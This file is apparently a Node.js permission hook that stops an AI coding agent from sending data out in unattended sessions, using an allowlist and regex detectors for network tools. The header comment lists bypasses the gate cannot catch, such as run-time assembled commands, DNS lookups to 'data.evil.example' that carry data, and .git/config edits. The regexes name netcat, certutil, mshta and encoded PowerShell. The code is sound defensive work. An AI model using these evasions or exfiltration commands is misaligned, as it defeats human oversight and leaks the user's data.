#!/usr/bin/env node
// outbound-gate.mjs — outbound tier 1: unattended sessions send nothing out except what the vault's allowlist names
// (Justin's guard Ballot 10.1 (a), 2026-11-17; design §6; build brief 6; DCG-V, 2026-11-18).
// Truncation check: the last line of this file should read FULL FILE LOADED.
//
// REQUIREMENT: in an unattended session, a shell command (Bash, PowerShell, Monitor) that reaches the network, a script
// run by an interpreter that reaches the network, and a calendar event with any guest but Justin MUST be refused
// unless the vault's allowlist (`evryn-guards/outbound-allowlist.json`) names it. In a session Justin is at, the same
// calls ASK, so the prompt reaches him (or are refused, if the vault says `attendedMode: "deny"`). Enforced by this
// vaulted hook, PreToolUse with onFailure "block"; tests/guards.test.mjs FAILS if a listed route gets through.
//
// HONESTLY, WHAT THIS IS (design §6): a classifier over command TEXT, the same class as Claude Code's own permission
// classifier, with our list. On native Windows nothing structural can stop a shell command reaching the network (Claude
// Code's sandbox doesn't run there; sandboxing docs line 13). The structural version is tier 2 (Ballot 10.2, tabled).
// WHAT IT CAN'T SEE (QCI findings 6 and 12 widened the list of what it CAN): a command assembled at run time
// (`$c="cu"+"rl"; & $c`, `& ('i'+'wr') …`, an alias or function defined earlier); a script that writes and runs another
// script at run time; a script run through something other than a named interpreter (a file association, a .lnk); a
// program whose network use isn't in its command line (an `npm test` whose tests call out, a git hook, a Python package,
// the backend's own code); a remote URL changed by editing .git/config directly (git push to "origin" then goes there);
// DNS lookups carrying data in the name (`nslookup data.evil.example`, `ping -n 1 data.evil.example`); a listening
// server (`python -m http.server`); WebFetch and WebSearch (left open on purpose: reading the web is core work, and a URL
// can carry data out; tier 2 closes it); MCP tools other than the calendar's two (Linear writes are denied by settings;
// Gmail send by the vault's deny rules). CAUGHT, each with a test: `$(echo curl)`, `c""url`, a client by full path
// (`C:/Windows/System32/curl.exe`), any -EncodedCommand abbreviation, git settings that redirect or run commands,
// browser and COM URL openers, Invoke-Expression, and any script run by an interpreter whose text reaches the network,
// whoever wrote it (or that can't be read), preloads (`--import`, `-r`) and stdin-fed code.

import fs from 'node:fs';
import path from 'node:path';
import { readStdin, guardLog, preDeny, preAsk, attended, normCmd, codeRoot, vaultJSON, allStrings, DATA, safeName } from './lib.mjs';

// The vault's list. Missing or unreadable: the strictest list (nothing allowed), so a broken install fails closed.
const ALLOW = { justinAddresses: [], attendedMode: 'deny', allow: [], attendedAllow: [], ...vaultJSON('outbound-allowlist.json', {}) };

// Words that reach the network. Matched as whole words in each segment of the flattened command: after a space, ( = & or
// a path separator (so C:/Windows/System32/curl.exe counts: QCI finding 6), with an optional .exe, and followed by the
// end, a space or a shell separator (so a path like shared/gh/ or a file named curl.md is not).
const NET = /(^|[\s(=&/])(curl|wget|invoke-webrequest|iwr|invoke-restmethod|irm|ssh|scp|sftp|ftp|tftp|nc|ncat|netcat|telnet|socat|net\.webclient|webclient|start-bitstransfer|bitsadmin|certutil|gh|railway|npx|bunx|pnpx|rsync|sendmail|send-mailmessage|rundll32|mshta)(\.exe)?(?=$|[\s;|&)'"])/;
const GIT_NET = /(^|[^a-z0-9_.-])git(\s+-c\s+\S+)*\s+(push|pull|fetch|clone|ls-remote|remote\s+(add|set-url)|submodule\s+update|send-email|request-pull)\b/;
// git settings that send it somewhere else or run a command (QCI finding 6): an alias with "!", core.sshCommand,
// core.fsmonitor or core.hooksPath, a remote's URL, url.*.insteadOf, credential and http helpers. Refused in `git -c`,
// `git config`, `git remote add|set-url`, and the GIT_SSH* / GIT_CONFIG_* environment forms, whatever the subcommand.
const GIT_RISK = /(^|[^a-z0-9_.-])git\b[^;|&]*\s-c\s+(alias\.|core\.(sshcommand|fsmonitor|hookspath|pager|editor|askpass)|remote\.|url\.|credential\.|http\.|protocol\.|include\.)|(^|[^a-z0-9_.-])git\s+config\b[^;|&]*\s(alias\.|core\.(sshcommand|fsmonitor|hookspath|pager|editor|askpass)|remote\.|url\.|credential\.|http\.|include\.)|(^|[^a-z0-9_.-])git\s+remote\s+(add|set-url)\b|(^|\s)(git_ssh|git_ssh_command|git_config_\w+|git_askpass|git_proxy_command)=/;
// Opening a URL in another program carries data out in the URL (QCI finding 12). `start` alone is too common (npm start),
// so it counts only with a URL after it; mshta and rundll32 always count (in NET above).
const URL_OPENER = /(^|[\s(=&;|])(start|start-process|saps|explorer(\.exe)?)\s+[^;|&]*?(https?|ftp|file):/;
// PowerShell's COM HTTP objects and Invoke-Expression (which runs a string, the usual way to hide a command).
const PS_RISK = /msxml2\.|winhttp\.|serverxmlhttp|(^|[\s(;|&])(iex|invoke-expression)(?=$|[\s(;'"])/;
const PKG_NET = /(^|[^a-z0-9_.-])(npm|pnpm|yarn|bun)\s+(i|install|ci|add|publish|update|up|exec|dlx|x)\b|(^|[^a-z0-9_.-])(pip3?|python3?\s+-m\s+pip|uv|poetry)\s+(install|add|download)\b/;
// Network APIs in code: inline (`node -e`, `python -c`, a PowerShell script block) or in a script this session wrote.
// (DCF 11/18: also any import of node's network modules, so `require('https').request(` and `import http from 'node:http'`
// count, not only the literal `https.request(`.)
const NET_API = /require\s*\(\s*['"]?(node:)?(https?|net|tls|dgram|undici)['"]?\s*\)|\bfrom\s+['"](node:)?(https?|net|tls|dgram)['"]|import\s*\(\s*['"](node:)?(https?|net|tls|dgram)['"]|fetch\s*\(|https?\.(request|get)\s*\(|net\.(connect|createconnection)|tls\.connect|new\s+websocket|websocket\s*\(|xmlhttprequest|urllib|requests\.(get|post|put|patch|delete|request|session)|http\.client|socket\.(socket|create_connection)|invoke-webrequest|invoke-restmethod|net\.webclient|system\.net\.http|undici|axios|node-fetch|child_process.*curl/;
// Inline code is checked for network APIs only when an interpreter runs it (node -e, python -c, pwsh -command), so a grep
// FOR the word fetch( isn't refused. The PowerShell tool's whole command is code, so it is always checked.
const INLINE = /(^|[\s(])(node|nodejs|deno|bun|python3?|py|ruby|perl|php|pwsh|powershell)(\.exe)?(\s+\S+)*?\s+(-(e|c|p|r|ec|command)|--(eval|print))(\s|$)/;
// Any abbreviation of -EncodedCommand, -ec included (QCI finding 6), followed by base64.
const ENCODED = /(^|\s)-e[a-z]*\s+[a-z0-9+/=]{16,}/;
const RUNNERS = /(^|[\s;&|(/])(node|nodejs|python3?|py|pwsh|powershell|bash|sh|tsx|ts-node|deno|bun|cscript|wscript|cmd\s+\/c)(\.exe)?\s+(?:-[^\s]+\s+)*("?)([^\s"]+\.(m?js|cjs|ts|py|ps1|sh|bat|cmd|vbs))/g;
// A file an interpreter is told to preload (node --import/-r/--require/--loader, python -m is not a file).
const PRELOAD = /(^|[\s;&|(/])(node|nodejs|deno|bun)(\.exe)?\s+(?:\S+\s+)*?(--import|-r|--require|--loader|--experimental-loader)[\s=]+([^\s]+)/g;
// An interpreter fed code on stdin: from a file (`node < x.mjs`, `node --input-type=module < x.mjs`) or a pipe
// (`cat x.mjs | node`). A pipe can't be checked, so it is refused; a file is read like any other script.
const STDIN_FILE = /(^|[\s;&|(/])(node|nodejs|python3?|py|deno|bun|pwsh|powershell)(\.exe)?(\s+-[^\s<]+)*\s*<\s*([^\s;&|]+)/g;
const STDIN_PIPE = /\|\s*(node|nodejs|python3?|py|deno|bun|pwsh|powershell)(\.exe)?(\s+-[^\s|;&]+)*\s*($|[;&|)])/;

const segments = c => c.split(/&&|\|\||[;|\n&]/).map(s => s.trim()).filter(Boolean);
const re = s => { try { return new RegExp(s); } catch { return null; } };
const inCodeRoot = cwd => !!cwd && path.resolve(cwd).toLowerCase().startsWith(path.resolve(codeRoot()).toLowerCase());
const allowed = (seg, cwd, list) => list.some(e => { const r = re(typeof e === 'string' ? e : e.pattern); return r && r.test(seg) && (!e.cwdInCodeRoot || inCodeRoot(cwd)); });

// The scripts this session wrote (PostToolUse on Write, Edit, NotebookEdit records them).
const writtenFile = session => path.join(DATA, 'outbound-written', `${safeName(session)}.json`);
const written = session => { try { return JSON.parse(fs.readFileSync(writtenFile(session), 'utf8')); } catch { return []; } };

function shellFindings(command, cwd, session, powershell = false) {
  const c = normCmd(command);
  const found = [];
  if (ENCODED.test(c) && /powershell|pwsh/.test(c)) found.push('an encoded PowerShell command (it can\'t be checked)');
  // A command that substitutes another command's output ($(…), backticks, <(…)) can hide a second command inside an
  // allowlisted one, so nothing in it counts as allowlisted. normCmd strips backticks, so test the raw text.
  const substitutes = /\$\(|`|<\(|>\(/.test(String(command || ''));
  // A segment the vault's allowlist names (with no substitution anywhere) is trusted whole: its script is a committed
  // one we chose (ping.mjs and tasks.mjs both reach the network on purpose). Everything else is checked.
  const open = segments(c).filter(seg => substitutes || !allowed(seg, cwd, ALLOW.allow));
  for (const seg of open) {
    if (GIT_RISK.test(seg)) { found.push(`a git setting that can send it elsewhere or run a command: ${seg.slice(0, 100)}`); continue; }
    const net = NET.test(seg) || GIT_NET.test(seg) || PKG_NET.test(seg) || URL_OPENER.test(seg) || (powershell && PS_RISK.test(seg)) || (/(^|[\s(/])(powershell|pwsh)(\.exe)?\s/.test(seg) && PS_RISK.test(seg)) || ((INLINE.test(seg) || powershell) && NET_API.test(seg));
    if (net) found.push(seg.slice(0, 120));
  }
  // Scripts run by an interpreter, WHOEVER wrote them (QCI finding 6: a script written through Bash, or a copy of one,
  // was never recorded): read each and refuse it if it reaches the network. A script that can't be read (it doesn't
  // exist yet, say, because the same command writes or copies it) can't be checked, so it is refused too. And when a
  // command both runs an interpreter and carries network code in its own text (a heredoc that writes the script it then
  // runs), it is refused whatever the file on disk says now.
  const openText = open.join(' ; ');
  const files = [...openText.matchAll(RUNNERS)].map(m => m[5]).concat([...openText.matchAll(PRELOAD)].map(m => m[5]), [...c.matchAll(STDIN_FILE)].filter(m => open.some(s => s.includes(m[2]))).map(m => m[5]));
  for (const rel of files) {
    const f = path.resolve(cwd || codeRoot(), rel).replace(/\\/g, '/').toLowerCase();
    let body = ''; try { body = fs.readFileSync(f, 'utf8').toLowerCase(); } catch { body = 'fetch('; }   // can't read it: assume the worst
    if (NET_API.test(body) || NET.test(body)) found.push(`a script that reaches the network (or can't be checked): ${rel}`);
  }
  if (open.length && STDIN_PIPE.test(c)) found.push('code piped into an interpreter (it can\'t be checked)');
  if (files.length && NET_API.test(openText)) found.push('a command that runs a script and carries network code in its own text');
  return [...new Set(found)];
}

function calendarFindings(input) {
  const mine = ALLOW.justinAddresses.map(a => a.toLowerCase());
  const emails = allStrings(input).flatMap(s => [...String(s).matchAll(/[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}/gi)].map(m => m[0].toLowerCase()));
  // An attendee entry's own email field must be one of his, whatever its spelling (QCI's probe: "someone @example.com",
  // with a space, slipped past the address pattern).
  const guests = (Array.isArray(input?.attendees) ? input.attendees : []).map(a => String(typeof a === 'string' ? a : a?.email ?? '').replace(/\s+/g, '').toLowerCase());
  return [...new Set([...emails, ...guests].filter(e => !mine.includes(e)))];
}

function pre(p) {
  const t = p.tool_name || ''; const input = p.tool_input || {};
  let why = null;
  if (['Bash', 'PowerShell', 'Monitor'].includes(t)) {
    const f = shellFindings(input.command, p.cwd, p.session_id, t === 'PowerShell');
    if (f.length && attended() && f.every(seg => allowed(seg, p.cwd, ALLOW.attendedAllow))) return null;
    if (f.length) why = `this command reaches the network outside the vault's allowlist (${f.join(' · ')})`;
  } else if (/^mcp__claude_ai_google_calendar__(create_event|update_event)$/i.test(t)) {
    const g = calendarFindings(input);
    if (g.length) why = `this calendar event would invite someone other than Justin (${g.join(', ')})`;
  }
  if (!why) return null;
  guardLog({ guard: 'outbound', event: attended() ? 'pre-ask' : 'pre-deny', session: p.session_id, tool: t });
  if (attended() && ALLOW.attendedMode === 'ask') return preAsk(`Outbound gate: ${why}. Justin, allow it only if you meant it.`);
  return preDeny(`Outbound gate: ${why}. An unattended session sends nothing out except what the vault's allowlist names (Justin's guard Ballot 10.1). Don't route around it; if your task needs this, say so in your task's notes.`);
}

function post(p) {
  if (!['Write', 'Edit', 'NotebookEdit', 'MultiEdit'].includes(p.tool_name)) return null;
  const f = p.tool_input?.file_path || p.tool_input?.notebook_path;
  if (!f) return null;
  const abs = path.resolve(p.cwd || codeRoot(), f).replace(/\\/g, '/').toLowerCase();
  const list = new Set(written(p.session_id)); list.add(abs);
  fs.mkdirSync(path.dirname(writtenFile(p.session_id)), { recursive: true });
  fs.writeFileSync(writtenFile(p.session_id), JSON.stringify([...list]));
  return null;
}

const { payload } = readStdin();
let out = null;
try { out = payload.hook_event_name === 'PreToolUse' ? pre(payload) : payload.hook_event_name === 'PostToolUse' ? post(payload) : null; }
catch (e) {
  guardLog({ guard: 'outbound', event: 'ERROR', session: payload.session_id, error: String(e?.message || e).slice(0, 200) });
  if (payload.hook_event_name === 'PreToolUse' && !attended()) out = preDeny('Outbound gate: the gate hit an error, so this call is refused in an unattended session. Tell the Admiral.');
}
if (out) process.stdout.write(out);
process.exit(0);

// Truncation canary — DO NOT REMOVE: FULL FILE LOADED
